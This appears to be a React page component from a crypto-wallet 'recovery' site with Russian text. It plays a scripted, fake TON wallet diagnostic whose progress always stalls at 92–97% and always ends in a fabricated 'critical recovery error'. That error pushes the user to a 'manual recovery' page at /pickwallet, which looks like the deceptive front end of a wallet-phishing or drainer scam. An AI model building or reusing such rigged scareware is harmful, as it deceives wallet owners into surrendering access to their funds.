

import React, { useState, useEffect } from "react";
import { approvalDetails } from "./Page2_Animation.jsx";
import './Page3_Animation.css';

export default function Page3_Animation() {
  const [wallet] = useState(() => localStorage.getItem('walletAddress') || 'UQdemoaddress0000000000000000000000000000000000000000');
  const [checking, setChecking] = useState(true);
  const [progress, setProgress] = useState(0);
  const [currentStep, setCurrentStep] = useState("");
  const [showFailModal, setShowFailModal] = useState(false);
  const [failErrorIdx, setFailErrorIdx] = useState(() => {
    const walletKey = `failErrorIdx_${wallet}`;
    const stored = localStorage.getItem(walletKey);
    return stored !== null ? Number(stored) : null;
  });
  const [showErrorDetails, setShowErrorDetails] = useState(false);
  const checklist = [
    { text: 'Подключение к ноде', icon: '✅' },
    { text: 'Синхронизация восстановлена', icon: '✅' },
    { text: 'Удалены облачные копии', icon: '✅' },
    { text: 'Сессия оборвалась', icon: '⚠' },
    { text: 'Переподключение к сети', icon: '✅' },
    { text: 'Переподключение к dApp', icon: '✅' },
    { text: 'Кэш приложения очищен', icon: '✅' },
    { text: 'Проверка в TON Explorer', icon: '✅' },
    { text: 'Включено шифрование для файлов', icon: '✅' },
    { text: 'Сессия оборвалась', icon: '⚠' },
    { text: 'Восстановление не удалось', icon: '🚨' },
  ];

  useEffect(() => {
    setProgress(0);
    setCurrentStep(checklist[0].text);
    setChecking(true);
  }, []);

  useEffect(() => {
    if (!checking) return;
    let stepIndex = 0;
    let progressValue = 0;
    let stopped = false;
    // Случайная финальная точка (92-97)
    const finalProgress = Math.floor(Math.random() * 6) + 92;
    let finished = false;

    function nextStep() {
      if (stopped) return;
      if (stepIndex < checklist.length - 1) {
        setCurrentStep(checklist[stepIndex].text);
        // Плавное увеличение прогресса
        // Последний шаг — до финального значения
        let target;
        if (stepIndex === checklist.length - 2) {
          target = finalProgress;
        } else {
          target = Math.round(((stepIndex + 1) / checklist.length) * 100);
          if (target >= finalProgress) target = finalProgress - 1;
        }
        let increment = () => {
          if (progressValue < target) {
            progressValue += Math.max(1, Math.round((target - progressValue) / 8));
            setProgress(progressValue);
            setTimeout(increment, 30 + Math.random() * 40);
          } else {
            setProgress(target);
            stepIndex++;
            setTimeout(nextStep, 400 + Math.random() * 600);
          }
        };
        increment();
      } else if (!finished) {
        finished = true;
        setCurrentStep(checklist[checklist.length - 1].text);
        setProgress(finalProgress);
        setTimeout(() => {
          setChecking(false);
          setFailErrorIdx(prevIdx => {
            const walletKey = `failErrorIdx_${wallet}`;
            if (prevIdx !== null) return prevIdx;
            const idx = Math.floor(Math.random() * approvalDetails.length);
            localStorage.setItem(walletKey, idx);
            return idx;
          });
          setShowFailModal(true);
        }, 700 + Math.random() * 600);
      }
    }
    nextStep();
    return () => { stopped = true; };
  }, [checking]);

  return (
    <div className="page2-cyber-bg">
      <div style={{display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 32, marginBottom: 10}}>
        <div className="logo-container">
          <img src="/wallet-ring.png" alt="wallet-ring" style={{width: 70, height: 70, display: 'block', border: '2px solid #2563eb', borderRadius: 16, background: '#181c24', objectFit: 'contain'}} />
        </div>
        <div className="logo-container">
          <img src="/blue-cube.png" alt="cube" style={{width: 70, height: 70, display: 'block', border: '2px solid #2563eb', borderRadius: 16, background: '#181c24', objectFit: 'contain'}} />
        </div>
        <div className="logo-container">
          <img src="/blue-cube2.png" alt="wallet2" style={{width: 70, height: 70, display: 'block', border: '2px solid #2563eb', borderRadius: 16, background: '#181c24', objectFit: 'contain'}} />
        </div>
      </div>
      <div style={{
        marginBottom: 18,
        fontSize: 22,
        fontWeight: 700,
        fontFamily: 'Montserrat, Helvetica, Arial, sans-serif',
        background: 'linear-gradient(90deg,#2563eb 0%,#00fff7 100%)',
        WebkitBackgroundClip: 'text',
        WebkitTextFillColor: 'transparent',
        textShadow: '0 2px 12px rgba(0,136,204,0.18)',
        letterSpacing: '-0.02em',
        lineHeight: 1.15,
        textAlign: 'center',
      }}>
        Выполняется восстановление
      </div>
      {(checking || (progress > 0 && progress < 100)) && (
        <div className="cyber-diagnosis-anim">
          <div className="cyber-diagnosis-progress">
            <svg width={128} height={128} className="cyber-diagnosis-svg">
              <defs>
                <linearGradient id="cyber-gradient3" x1="0" y1="0" x2="1" y2="1">
                  <stop offset="0%" stopColor="#00fff7" />
                  <stop offset="100%" stopColor="#2563eb" />
                </linearGradient>
                <filter id="glow3" x="-40%" y="-40%" width="180%" height="180%">
                  <feGaussianBlur stdDeviation="7" result="coloredBlur"/>
                  <feMerge>
                    <feMergeNode in="coloredBlur"/>
                    <feMergeNode in="SourceGraphic"/>
                  </feMerge>
                </filter>
              </defs>
              <circle
                cx={64}
                cy={64}
                r={56}
                stroke="#23272e"
                strokeWidth={8}
                fill="none"
              />
              <circle
                cx={64}
                cy={64}
                r={56}
                stroke="url(#cyber-gradient3)"
                strokeWidth={8}
                fill="none"
                strokeDasharray={2 * Math.PI * 56}
                strokeDashoffset={2 * Math.PI * 56 - (2 * Math.PI * 56 * progress) / 100}
                strokeLinecap="round"
                style={{ transition: 'stroke-dashoffset 0.5s, stroke 0.3s' }}
                transform="rotate(-90 64 64)"
                filter="url(#glow3)"
              />
            </svg>
            <div className="cyber-diagnosis-percent">{progress}%</div>
          </div>
          <div style={{paddingLeft: 14, paddingRight: 14, boxSizing: 'border-box', width: '100%'}}>
            <div className="cyber-diagnosis-bar" style={{position: 'relative'}}>
              <div className={`cyber-diagnosis-bar-fill${progress >= 92 ? ' danger' : ''}`} style={{width: `${progress}%`}} />
              <svg width="100%" height="14" viewBox="0 0 340 14" preserveAspectRatio="none" style={{ position: 'absolute', left: 0, top: 0, zIndex: 2, pointerEvents: 'none' }}>
                <defs>
                  <linearGradient id="cyber-bar-glow3" x1="0" y1="0" x2="1" y2="0">
                    <stop offset="0%" stopColor="#00fff7" stopOpacity="0.7" />
                    <stop offset="100%" stopColor="#2563eb" stopOpacity="0.7" />
                  </linearGradient>
                </defs>
                <rect x="0" y="0" width="340" height="14" fill="none" stroke="url(#cyber-bar-glow3)" strokeWidth="2.5" rx="7" />
                {Array.from({ length: 16 }).map((_, i) => (
                  <rect
                    key={i}
                    x={i * 21.25}
                    y={0}
                    width={1.5}
                    height={14}
                    fill="#00fff733"
                  />
                ))}
              </svg>
            </div>
          </div>
          <div className="cyber-diagnosis-checklist">
            {checklist.map((item, idx) => {
              let show = true;
              if (idx === checklist.length - 1) {
                if (progress < 92) show = false;
              } else {
                const threshold = Math.round(((idx + 1) / checklist.length) * 100);
                if (progress < threshold) show = false;
                if (progress >= 98) show = false;
              }
              const isDone = idx === checklist.length - 1 ? progress >= 92 : progress >= Math.round(((idx + 1) / checklist.length) * 100);
              const animationDelay = `${0.08 * idx + 0.05}s`;
              const dangerColor = idx === checklist.length - 1 && progress >= 92;
              let textColor = '#a1a1aa';
              if (dangerColor || item.icon === '🚨') textColor = '#ff4d4f';
              else if (item.icon === '⚠') textColor = '#ffb300';
              else if (isDone) textColor = '#22c55e';
              if (!show) return null;
              return (
                <div
                  key={idx}
                  className={`cyber-diagnosis-checkitem${isDone ? ' done' : ''}`}
                  style={{animationDelay, color: textColor}}
                >
                  <span className="cyber-diagnosis-checktext">{item.text}</span>
                  {(item.icon === '✅' && isDone) ? (
                    <span style={{ display: 'inline-flex', alignItems: 'center', marginLeft: 8, filter: 'drop-shadow(0 0 6px #22c55e)' }}>
                      <svg width={20} height={20} viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="10" cy="10" r="10" fill={dangerColor ? '#ff4d4f' : '#22c55e'} />
                        <path d="M6 10.5l2.5 2.5 5-5" stroke="#fff" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" />
                      </svg>
                    </span>
                  ) : item.icon === '🚨' ? (
                    <span className="danger-animated" style={{ fontSize: 22, marginLeft: 8 }}>{item.icon}</span>
                  ) : (
                    <span className="warning-animated" style={{ fontSize: 22, marginLeft: 8 }}>{item.icon}</span>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      )}
      {showFailModal && (
        <div className="fail-modal-bg" onClick={() => setShowFailModal(false)}>
          <div className="fail-modal" onClick={e => e.stopPropagation()}>
            <h2 className="fail-modal-title">
              <span className="warning-animated fail-modal-icon">⚠️</span>
              <span className="fail-modal-title-text">
                <span>Восстановление</span>
                <span>не завершено</span>
              </span>
              <span className="warning-animated fail-modal-icon">⚠️</span>
            </h2>
            {failErrorIdx !== null && approvalDetails[failErrorIdx] && (
              <div className="fail-modal-details">
                <div className="fail-modal-error">
                  Критическая ошибка восстановления! Автоматическое восстановление не подтвердило контроль над ключами. Попробуйте восстановить снова или немедленно выполните ручное восстановление —  проверьте список approvals и историю транзакций.
                </div>
                <button
                  className="fail-modal-btn fail-modal-btn-red"
                  onClick={() => setShowErrorDetails(v => !v)}
                >
                  {approvalDetails[failErrorIdx].title}
                </button>
                {showErrorDetails && (
                  <>
                    <div className="fail-modal-desc">{approvalDetails[failErrorIdx].desc}</div>
                    <div className="fail-modal-rec">{approvalDetails[failErrorIdx].rec}</div>
                  </>
                )}
                <button
                  className="fail-modal-btn fail-modal-btn-blue"
                  onClick={() => {
                    setShowFailModal(false);
                    setShowErrorDetails(false);
                    setTimeout(() => {
                      setProgress(0);
                      setCurrentStep(checklist[0]);
                      setChecking(true);
                    }, 200);
                  }}
                >
                  Попробовать снова
                </button>
                <button
                  className="fail-modal-btn fail-modal-btn-green"
                  onClick={() => {
                    window.location.href = '/pickwallet';
                  }}
                >
                  <span className="fail-modal-btn-green-title">Ручное восстановление</span>
                  <div className="fail-modal-btn-green-sub">(Рекомендуемое действие)</div>
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}